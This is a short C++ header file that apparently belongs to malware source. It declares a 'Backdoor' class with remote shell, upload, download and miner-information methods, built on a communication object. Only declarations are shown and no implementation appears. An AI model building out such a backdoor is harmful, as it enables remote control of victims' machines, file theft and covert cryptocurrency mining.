#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"

class Backdoor{
public:
    void shell();
    void upload(char *);
    void download(char *);
    void get_miner_info();
    

    Backdoor(char *, int, bool);

private:

    Communication *c;
    bool is_server;

};


#endif